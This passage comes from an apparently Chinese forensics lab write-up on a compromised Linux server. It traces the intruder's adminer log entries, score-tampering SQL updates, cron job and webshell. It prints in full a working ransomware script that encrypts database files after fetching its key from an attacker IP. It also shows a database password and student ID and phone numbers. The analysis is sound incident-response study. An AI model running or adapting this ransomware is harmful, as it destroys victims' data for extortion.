##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177641&amp;where[name]=范诗怡&amp;where[tel]=13611843060&amp;where[idcard]=310107200310040411&amp;where[score]=539


192.168.232.150 - - [04/May/2021:16:38:22 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177641&amp;where%5Bname%5D=%E8%8C%83%E8%AF%97%E6%80%A1&amp;where%5Btel%5D=13611843060&amp;where%5Bidcard%5D=310107200310040411&amp;where%5Bscore%5D=539 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177641&amp;where%5Bname%5D=%E8%8C%83%E8%AF%97%E6%80%A1&amp;where%5Btel%5D=13611843060&amp;where%5Bidcard%5D=310107200310040411&amp;where%5Bscore%5D=539" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177641&amp;where[name]=范诗怡&amp;where[tel]=13611843060&amp;where[idcard]=310107200310040411&amp;where[score]=539

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177641&amp;where[name]=范诗怡&amp;where[tel]=13611843060&amp;where[idcard]=310107200310040411&amp;where[score]=539


192.168.232.150 - - [04/May/2021:16:38:22 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 10729 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177641&amp;where%5Bname%5D=%E8%8C%83%E8%AF%97%E6%80%A1&amp;where%5Btel%5D=13611843060&amp;where%5Bidcard%5D=310107200310040411&amp;where%5Bscore%5D=539" 

## http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177641&amp;where[name]=范诗怡&amp;where[tel]=13611843060&amp;where[idcard]=310107200310040411&amp;where[score]=539


192.168.232.150 - - [04/May/2021:16:38:37 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4 HTTP/1.1" 200 10467 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 

192.168.232.150 - - [04/May/2021:16:39:38 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4" 

192.168.232.150 - - [04/May/2021:16:39:39 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4 HTTP/1.1" 200 11051 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4" 

192.168.232.150 - - [04/May/2021:16:39:48 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4" 

192.168.232.150 - - [04/May/2021:16:39:48 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4 HTTP/1.1" 200 10794 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4" 

192.168.232.150 - - [04/May/2021:16:39:52 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4" 

192.168.232.150 - - [04/May/2021:16:39:52 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4 HTTP/1.1" 200 10783 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;page=4" 

</code></pre> 
<p><img src="https://images2.imgbox.com/dc/e9/Tlkrfokl_o.png" alt="在这里插入图片描述"></p> 
<p>不知道密码，找数据库配置文件，<br> <img src="https://images2.imgbox.com/49/27/WneGnsku_o.png" alt="在这里插入图片描述"></p> 
<p>这样还找不到用</p> 
<pre><code class="prism language-bash"><span class="token function">find</span> / -name *database*
<span class="token function">find</span> / -name *db*
</code></pre> 
<p>这样的话找到内容就会比较多，需要细细分辨哪个是网站的数据库配置文件</p> 
<p>登录adminer<br> <img src="https://images2.imgbox.com/73/c6/EPN6TTz9_o.png" alt="在这里插入图片描述"></p> 
<p>数据库中已经没有表了<br> <img src="https://images2.imgbox.com/f3/fb/BK9DUzpB_o.png" alt="在这里插入图片描述"></p> 
<p>去找到加密文件<br> <img src="https://images2.imgbox.com/66/3e/ShKTXQN4_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/d2/88/nMaWsLum_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/03/1f/y5Eui9Zl_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad
<span class="token keyword">import</span> os
<span class="token keyword">import</span> time
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">discover_files</span><span class="token punctuation">(</span>startpath<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#判断后缀名，加密以下类型的后缀名的文件</span>
    extensions <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">'db'</span><span class="token punctuation">,</span> <span class="token string">'sql'</span><span class="token punctuation">,</span> <span class="token string">'dbf'</span><span class="token punctuation">,</span> <span class="token string">'mdb'</span><span class="token punctuation">,</span> <span class="token string">'opt'</span><span class="token punctuation">,</span> <span class="token string">'frm'</span><span class="token punctuation">,</span> <span class="token string">'ibd'</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">for</span> dirpath<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>startpath<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> files<span class="token punctuation">:</span>
            absolute_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>dirpath<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>
            ext <span class="token operator">=</span> absolute_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> ext <span class="token keyword">in</span> extensions<span class="token punctuation">:</span>
                <span class="token keyword">yield</span> absolute_path

<span class="token keyword">def</span> <span class="token function">modify_file_inplace</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> crypto<span class="token punctuation">,</span> key<span class="token punctuation">,</span> blocksize<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#加密文件的逻辑</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r+b'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        plaintext <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>blocksize<span class="token punctuation">)</span>

        <span class="token keyword">while</span> plaintext<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span> <span class="token operator">&lt;</span> blocksize<span class="token punctuation">:</span>
                padtext <span class="token operator">=</span> pad<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">,</span> style<span class="token operator">=</span><span class="token string">'pkcs7'</span><span class="token punctuation">)</span>
                ciphertext <span class="token operator">=</span> crypto<span class="token punctuation">(</span>padtext<span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                ciphertext <span class="token operator">=</span> crypto<span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span>

            f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>

            plaintext <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>blocksize<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_machine_id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#读取machine-id</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/machine-id'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">return</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#读取当前时间</span>
    <span class="token keyword">return</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y%m%d%H%M"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    
<span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> machine_id<span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#将读取到的machine-id和当前时间发给这个IP（攻击者IP），接受返回值</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
        url <span class="token operator">=</span> <span class="token string">'http://192.168.232.150:5000/key/{0}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>machine_id<span class="token punctuation">)</span><span class="token punctuation">,</span>
        json <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> 
            <span class="token string">'path'</span> <span class="token punctuation">:</span> path<span class="token punctuation">,</span>
            <span class="token string">'time'</span><span class="token punctuation">:</span> time
        <span class="token punctuation">}</span>
    <span class="token punctuation">)</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span>text

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#主函数</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token comment">#判断传入参数，如果传入参数不等于2就退出，第一个参数就是sys.argv[0]代表python3 CRY.py ./studient/中的CRY.py</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    path <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#那么sys.argv[1]就是./studient/，将./studient/传入path变量中</span>
    key <span class="token operator">=</span> get_key<span class="token punctuation">(</span>path<span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#调用get_key函数获取密钥</span>
    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> IV<span class="token operator">=</span>key<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> discover_files<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        modify_file_inplace<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">,</span> key<span class="token operator">=</span>key<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#实现加密算法逻辑</span>
        os<span class="token punctuation">.</span>rename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">+</span><span class="token string">'.CRY'</span><span class="token punctuation">)</span><span class="token comment">#给文件名后缀加上.CRY</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token string">'encrypted.'</span><span class="token punctuation">)</span><span class="token comment">#打印输出某某文件已加密</span>

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<p>那么我们因为不知道当时的时间，使用这个作为线索，可能要到黑客的电脑中寻找，找到后再编写解密脚本。</p> 
<h4><a id="7_150108145717145921HHMMSS140327_422"></a>7. 入侵者首次登录成功时间为15:01:08（14:57:17）（14:59:21）（格式要求：HH:MM:SS，如14:03:27）</h4> 
<p>这个我也找了半天，登录时间到底指什么，也是基于再pc上找到的这张爆破成功截图，开始爆破时间是14：57：14，随后马上爆破成功了基于这个时间查找linux首次成功登陆时间,所以第一次成功登录应该是这个时间之后的第一次成功登录时间。<br> <img src="https://images2.imgbox.com/66/52/TzMrY2pK_o.png" alt="在这里插入图片描述"></p> 
<p>找到该时段的日志<br> <img src="https://images2.imgbox.com/2e/38/ukcf79Qc_o.png" alt="在这里插入图片描述"></p> 
<p>攻击是发生在5月4日14：57：14之后，查找这个时间段的登录日志、认证日志、安全日志等。</p> 
<pre><code class="prism language-bash">早期unix 在/usr/adm
较新版本 在/var/adm
solaris<span class="token operator">&amp;</span>linux<span class="token operator">&amp;</span>bsd 在 /var/log
lastlog:近期成功登陆记录
loginlog:不良的登陆尝试记录
messages:记录输出到系统主控台以及由syslog系统服务程序产生的消息、
utmp:记录当前登陆的每个用户
utmpx:拓展的utmp
wtmp:记录每一次用户登陆和注销的历史信息 last -f /var/log/wtmp
vold.log:使用外部介质出现的错误
xferkig:记录ftp的存取情况
sulog:记录su命令的使用情况
acct:记录每个用户使用过的命令
last：/var/log/secure 最后登录
<span class="token number">1</span>、安全日志 /var/log/secure
作用：安全日志secure包含验证和授权方面信息
分析：是否有IP爆破成功
<span class="token number">2</span>、用户信息 /etc/passwd
内容含义：注册名、口令、用户标识号、组标识号、用户名、用户主目录、命令解释程序
分析：是否存在攻击者创建的恶意用户
<span class="token number">3</span>、命令执行记录 ~/.bash_history
作用：命令执行记录 ~/.bash_history
分析：是否有账户执行过恶意操作系统命令
<span class="token number">4</span>、root邮箱 /var/spool/mail/root
作用：root邮箱 /var/spool/mail/root
分析：root邮箱的一个文件，在该文件中包含大量信息，
当日志被删除可查询本文件
<span class="token number">5</span>、中间件日志<span class="token punctuation">(</span>Web日志access_log<span class="token punctuation">)</span>
nginx、apache、tomcat、jboss、weblogic、websphere作用：
记录访问信息分析：请求次数过大，访问敏感路径的IP位置：/var/log下 access.log文件（apache默认
位置）
位置：/var/log/nginx下 access名称日志（nginx日志位置）
位置：tomcat、weblogic等日志均存放在安装路径下logs文件下
访问日志结构：访问IP---时间---请求方式---请求路径---请求协议----请求状态---字节数
<span class="token number">6</span>.登陆日志（可直接使用命令调取该信息，对应命令last/lastb）
位置：/var/log/wtmp <span class="token comment">#成功连接的IP信息</span>
位置：/var/log/btmp <span class="token comment">#连接失败的IP信息</span>
<span class="token number">7</span>.cron<span class="token punctuation">(</span>定制任务日志<span class="token punctuation">)</span>日志
位置：/var/log/cron
作用：查看历史计划任务（对该文件进行分析调取恶意病毒执行的计划任务，获取准确时间）
<span class="token number">8</span>、history
日志位置：~/.bash_history
作用：操作命令记录，可筛查攻击者执行命令信息
<span class="token number">9</span>、其他日志
redis、sql server、mysql、oracle等
作用：记录访问信息分析：敏感操作
</code></pre> 
<p>这里在，虽然题解显得很简单，但是实际解题上还是需要花费很大的时间精力的。<br> <img src="https://images2.imgbox.com/48/44/XnPH3e1D_o.png" alt="在这里插入图片描述"></p> 
<p>可以看到在14:57:17这个时间爆破工具成功登录了，然后马上又断开连接了。</p> 
<h4><a id="8__1_489"></a>8. 入侵者设置了1个定时任务</h4> 
<p><img src="https://images2.imgbox.com/dc/9b/UEUh3hgu_o.gif" alt="在这里插入图片描述"></p> 
<h4><a id="9__tmpbackuplogbackuplog_493"></a>9. 定时任务将大量日志文件转存至/tmp/backup-log/（backup-log）目录</h4> 
<p><img src="https://images2.imgbox.com/95/4a/9Eo8eHis_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="10_21webshell_497"></a>10. 服务器的网站目录及子目录中，共存在2（1）个webshell</h4> 
<p>基于前面的分析，1.php肯定为一个webshell，个人没有把adminer.php算上，adminer也是黑客上传的，adminer虽然是正经应用，但是从入侵角度来看就是一个数据库的大马，可以算为webshell。出于验证考虑，将网站源码导出，使用D盾等webshell扫描工具扫描其中的webshell。<br> <img src="https://images2.imgbox.com/92/d8/cOMowHtV_o.png" alt="在这里插入图片描述"></p> 
<p>共发现1个可能的webshell</p> 
<h4><a id="11_rootnb250250_505"></a>11. 数据库账号为root，密码为nb250250</h4> 
<p><img src="https://images2.imgbox.com/d6/62/RfJ7yIbJ_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="12_5562_511"></a>12. 数据库版本号为5.5.62</h4> 
<p><img src="https://images2.imgbox.com/22/e7/8Q5G7zzA_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="13_3_515"></a>13. 嫌疑人入侵服务器后，在数据库中共修改了3个学生的分数</h4> 
<p>这里从先前的日志中，可以判断，对学生执行了三个post语句，</p> 
<pre><code class="prism language-verilog">192.168.232.150 - - [04/May/2021:16:38:10 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177884&amp;where%5Bname%5D=%E8%83%A1%E9%87%91%E4%BF%9D&amp;where%5Btel%5D=13122787578&amp;where%5Bidcard%5D=341202200402111723&amp;where%5Bscore%5D=564 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177884&amp;where%5Bname%5D=%E8%83%A1%E9%87%91%E4%BF%9D&amp;where%5Btel%5D=13122787578&amp;where%5Bidcard%5D=341202200402111723&amp;where%5Bscore%5D=564" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177884&amp;where[name]=胡金保&amp;where[tel]=13122787578&amp;where[idcard]=341202200402111723&amp;where[score]=564

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177884&amp;where[name]=胡金保&amp;where[tel]=13122787578&amp;where[idcard]=341202200402111723&amp;where[score]=564
</code></pre> 
<pre><code class="prism language-verilog">192.168.232.150 - - [04/May/2021:16:38:17 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20176743&amp;where%5Bname%5D=%E9%87%91%E5%96%86%E6%98%8A&amp;where%5Btel%5D=52856616&amp;where%5Bidcard%5D=310107200511295728&amp;where%5Bscore%5D=538 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20176743&amp;where%5Bname%5D=%E9%87%91%E5%96%86%E6%98%8A&amp;where%5Btel%5D=52856616&amp;where%5Bidcard%5D=310107200511295728&amp;where%5Bscore%5D=538" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20176743&amp;where[name]=金喆昊&amp;where[tel]=52856616&amp;where[idcard]=310107200511295728&amp;where[score]=538
##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20176743&amp;where[name]=金喆昊&amp;where[tel]=52856616&amp;where[idcard]=310107200511295728&amp;where[score]=538
</code></pre> 
<pre><code class="prism language-verilog">192.168.232.150 - - [04/May/2021:16:38:22 +0800] "POST /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177641&amp;where%5Bname%5D=%E8%8C%83%E8%AF%97%E6%80%A1&amp;where%5Btel%5D=13611843060&amp;where%5Bidcard%5D=310107200310040411&amp;where%5Bscore%5D=539 HTTP/1.1" 302 5 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where%5Bid%5D=20177641&amp;where%5Bname%5D=%E8%8C%83%E8%AF%97%E6%80%A1&amp;where%5Btel%5D=13611843060&amp;where%5Bidcard%5D=310107200310040411&amp;where%5Bscore%5D=539" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177641&amp;where[name]=范诗怡&amp;where[tel]=13611843060&amp;where[idcard]=310107200310040411&amp;where[score]=539

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;edit=score&amp;where[id]=20177641&amp;where[name]=范诗怡&amp;where[tel]=13611843060&amp;where[idcard]=310107200310040411&amp;where[score]=539
</code></pre> 
<p>对胡金保、金喆昊、范诗怡的数值进行了post，而前面的赵天歌和张晓并没有进行post操作。这里我们还不能确定其具体修改了几个人的数据，只能有个印象，重点关注这3个。</p> 
<pre><code class="prism language-verilog">192.168.232.150 - - [04/May/2021:16:35:32 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E5%BC%A0%E6%99%93&amp;where%5B01%5D%5Bcol%5D=&amp;where%5B01%5D%5Bop%5D=%3D&amp;where%5B01%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100 HTTP/1.1" 200 4645 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=张晓&amp;where[01][col]=&amp;where[01][op]==&amp;where[01][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100

192.168.232.150 - - [04/May/2021:16:36:14 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E8%B5%B5%E5%A4%A9%E6%AD%8C&amp;where%5B2%5D%5Bcol%5D=&amp;where%5B2%5D%5Bop%5D=%3D&amp;where%5B2%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100 HTTP/1.1" 200 4658 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E5%BC%A0%E6%99%93&amp;where%5B01%5D%5Bcol%5D=&amp;where%5B01%5D%5Bop%5D=%3D&amp;where%5B01%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100" 

##/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=赵天歌&amp;where[2][col]=&amp;where[2][op]==&amp;where[2][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=张晓&amp;where[01][col]=&amp;where[01][op]==&amp;where[01][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100


192.168.232.150 - - [04/May/2021:16:36:43 +0800] "GET /adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score HTTP/1.1" 200 10460 "http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns%5B0%5D%5Bfun%5D=&amp;columns%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bcol%5D=&amp;where%5B0%5D%5Bop%5D=%3D&amp;where%5B0%5D%5Bval%5D=%E8%B5%B5%E5%A4%A9%E6%AD%8C&amp;where%5B2%5D%5Bcol%5D=&amp;where%5B2%5D%5Bop%5D=%3D&amp;where%5B2%5D%5Bval%5D=&amp;order%5B0%5D=&amp;limit=50&amp;text_length=100" 

##http://192.168.232.148/adminer.php?server=localhost&amp;username=root&amp;db=studient&amp;select=score&amp;columns[0][fun]=&amp;columns[0][col]=&amp;where[0][col]=&amp;where[0][op]==&amp;where[0][val]=赵天歌&amp;where[2][col]=&amp;where[2][op]==&amp;where[2][val]=&amp;order[0]=&amp;limit=50&amp;text_length=100
</code></pre> 
<p>查看数据库配置文件，看能不能从日志中审计出有效信息，发现开启binlog<br> <img src="https://images2.imgbox.com/4d/fb/puzw8wtT_o.png" alt="在这里插入图片描述"></p> 
<p>binlog是个好东西，记录增删改查记录的的。<a href="https://blog.csdn.net/xzqxiaoqing/article/details/84099274">(4条消息) 什么是 binlog？_xzqxiaoqing的博客-CSDN博客_binlog是什么</a><br> <img src="https://images2.imgbox.com/40/84/wCK0lPT7_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/88/13/mavuG5vo_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/0a/89/pDKpeB9K_o.png" alt="在这里插入图片描述"></p> 
<p>binlog搜寻无果，查找其他日志，这里找到还有一个localhost.log<br> <img src="https://images2.imgbox.com/b1/d8/yvbpJOtV_o.png" alt="在这里插入图片描述"></p> 
<p>其中记录了很多数据库操作，对其进行审计，日志量不大，对其审计得通过update方法共修改3人成绩</p> 
<p>和我们前面web日志审计结果相同</p> 
<pre><code class="prism language-mysql">		   24 Query	UPDATE `score` SET
`id` = '20177884',
`name` = '胡金保',
`tel` = '13122787578',
`idcard` = '341202200402111723',
`score` = '600'
WHERE `id` = '20177884' AND `name` = '胡金保' AND `name` = '胡金保' COLLATE utf8_bin AND `tel` = '13122787578' AND `idcard` = '341202200402111723' AND `score` = '564' LIMIT 1
		   24 Quit	
</code></pre> 
<p><img src="https://images2.imgbox.com/41/89/bSAT6LFO_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-mysql">		   28 Query	UPDATE `score` SET
`id` = '20176743',
`name` = '金喆昊',
`tel` = '52856616',
`idcard` = '310107200511295728',
`score` = '600'
WHERE `id` = '20176743' AND `name` = '金喆昊' AND `name` = '金喆昊' COLLATE utf8_bin AND `tel` = '52856616' AND `idcard` = '310107200511295728' AND `score` = '538' LIMIT 1
		   28 Quit	
</code></pre> 
<p><img src="https://images2.imgbox.com/34/19/0ZsinbuB_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-mysql">		   32 Query	UPDATE `score` SET
`id` = '20177641',
`name` = '范诗怡',
`tel` = '13611843060',
`idcard` = '310107200310040411',
`score` = '600'
WHERE `id` = '20177641' AND `name` = '范诗怡' AND `name` = '范诗怡' COLLATE utf8_bin AND `tel` = '13611843060' AND `idcard` = '310107200310040411' AND `score` = '539' LIMIT 1
</code></pre> 
<p><img src="https://images2.imgbox.com/37/9e/GAc8VC6N_o.png" alt="在这里插入图片描述"></p> 
<table><thead><tr><th>名字</th><th>原成绩</th><th>修改后成绩</th></tr></thead><tbody><tr><td>胡金保</td><td>564</td><td>600</td></tr><tr><td>金喆昊</td><td>538</td><td>600</td></tr><tr><td>范诗怡</td><td>539</td><td>600</td></tr></tbody></table> 
<h4><a id="14_52_624"></a>14. 嫌疑人入侵服务器后，在数据库中共删除了52条学生相关记录</h4> 
<p>同样在日志中可以看到删除日志<br> <img src="https://images2.imgbox.com/ca/95/8oAY2TqT_o.png" alt="在这里插入图片描述"></p> 
